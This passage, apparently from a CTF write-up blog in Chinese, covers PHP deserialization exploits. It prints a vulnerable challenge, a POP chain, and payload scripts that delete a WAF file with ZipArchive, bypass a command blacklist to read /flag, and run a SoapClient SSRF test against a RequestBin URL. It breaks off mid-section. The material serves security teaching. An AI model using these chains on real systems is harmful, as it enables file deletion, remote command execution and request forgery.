class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$register</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;register)===<span class="string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice=<span class="keyword">new</span> <span class="title function_ invoke__">login</span>(<span class="variable">$this</span>-&gt;file,<span class="variable">$this</span>-&gt;filename,<span class="variable">$this</span>-&gt;content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice = <span class="keyword">new</span> <span class="title function_ invoke__">register</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;choice-&gt;<span class="title function_ invoke__">checking</span>(<span class="variable">$this</span>-&gt;username,<span class="variable">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>,<span class="variable">$filename</span>,<span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file=<span class="variable">$file</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename=<span class="variable">$filename</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content=<span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checking</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$username</span>===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;<span class="variable">$password</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$this</span>-&gt;filename,<span class="variable">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;login success you can to open shell file!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">register</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checking</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$username</span>===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;<span class="variable">$password</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;success register admin&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;please register admin &#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;waf.txt&#x27;</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">shell</span>(<span class="variable">$content</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]!==<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]&amp;&amp;(<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;unser&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>pop链</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Game</span>::<span class="variable constant_">wakeup</span>-&gt;login::<span class="variable constant_">checking</span>-&gt;<span class="title class_">Open</span>::<span class="variable constant_">open</span></span><br></pre></td></tr></table></figure><p>先读<strong>shell.php</strong>里的内容</p><p><code>if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;)</code>md5解出来就是admin</p><p><strong>payload1</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$register</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;register)===<span class="string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span>)&#123;    <span class="comment">// admin</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice=<span class="keyword">new</span> <span class="title function_ invoke__">login</span>(<span class="variable">$this</span>-&gt;file,<span class="variable">$this</span>-&gt;filename,<span class="variable">$this</span>-&gt;content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice = <span class="keyword">new</span> <span class="title function_ invoke__">register</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;choice-&gt;<span class="title function_ invoke__">checking</span>(<span class="variable">$this</span>-&gt;username,<span class="variable">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;   </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Game</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;file=<span class="keyword">new</span> <span class="title class_">Open</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到<strong>shell.php</strong>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shell</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>)&lt;<span class="number">10</span>)&#123;                                                  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;so long!&#x27;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;login success you can to open shell file!</span><br></pre></td></tr></table></figure><p>再结合open类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;waf.txt&#x27;</span>))&#123;    </span><br><span class="line">            <span class="title function_ invoke__">shell</span>(<span class="variable">$content</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>.<span class="string">&quot;.php&quot;</span>);    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>必须要不存在waf.txt，才可以执行命令，这里就只能使用ZipArchive 类调用他的open方法来将waf.txt给删除</p><p>即构造<code>ZipArchive::open(waf.txt, ZipArchive::OVERWRITE)</code></p><p><strong>payload2</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$register</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;register)===<span class="string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span>)&#123;    <span class="comment">// admin</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice=<span class="keyword">new</span> <span class="title function_ invoke__">login</span>(<span class="variable">$this</span>-&gt;file,<span class="variable">$this</span>-&gt;filename,<span class="variable">$this</span>-&gt;content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice = <span class="keyword">new</span> <span class="title function_ invoke__">register</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;choice-&gt;<span class="title function_ invoke__">checking</span>(<span class="variable">$this</span>-&gt;username,<span class="variable">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;   </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Game</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;file=<span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;filename=<span class="string">&quot;waf.txt&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;content = <span class="title class_">ZipArchive</span>::<span class="variable constant_">OVERWRITE</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>执行后即可删除waf.txt,由于shell.php中过滤了很多函数，所以这里可使用<code>n\l /flag</code>读取</p><p><strong>payload3</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$register</span>=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>=<span class="string">&#x27;waf.txt&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span>=<span class="string">&#x27;n\l /flag&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;register)===<span class="string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice=<span class="keyword">new</span> <span class="title function_ invoke__">login</span>(<span class="variable">$this</span>-&gt;file,<span class="variable">$this</span>-&gt;filename,<span class="variable">$this</span>-&gt;content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice = <span class="keyword">new</span> <span class="title function_ invoke__">register</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;choice-&gt;<span class="title function_ invoke__">checking</span>(<span class="variable">$this</span>-&gt;username,<span class="variable">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>,<span class="variable">$filename</span>,<span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file=<span class="variable">$file</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename=<span class="variable">$filename</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content=<span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checking</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$username</span>===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;<span class="variable">$password</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$this</span>-&gt;filename,<span class="variable">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;login success you can to open shell file!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">register</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checking</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$username</span>===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;<span class="variable">$password</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;success register admin&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;please register admin &#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;1.txt&#x27;</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">shell</span>(<span class="variable">$content</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Game</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;file=<span class="keyword">new</span> <span class="title class_">Open</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="SoapClient-类进行-SSRF"><a href="#SoapClient-类进行-SSRF" class="headerlink" title="SoapClient 类进行 SSRF"></a>SoapClient 类进行 SSRF</h2><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041112652.png" alt="image-20221004111236510"></p><p>最主要的是这个类里带有一个<code>__call</code>方法，当<code>__call</code> 方法被触发后，它可以发送 HTTP 和 HTTPS 请求,正是这个 __call 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。</p><p>soap类的构造函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public SoapClient::SoapClient(mixed $wsdl [，array $options ])</span><br><span class="line">第一个参数指明是否是wsdl模式，为null则表示非wsdl模式。</span><br><span class="line">第二个参数为一个数组，在wsdl模式下，此参数可选；在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，uri是SOAP服务的目标命名空间。</span><br></pre></td></tr></table></figure><p>在了解完参数之后，就可以利用该类来进行ssrf了</p><p>首先监听一个网站，这里用的是<a href="https://requestbin.io/">RequestBin</a></p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041117986.png" alt="image-20221004111710824"></p><p><strong>test1.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;https://requestbin.io/12lhej01&#x27;</span>, <span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;This is a ssrf test&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();    <span class="comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span></span><br></pre></td></tr></table></figure><p>运行test.php后</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041120612.png" 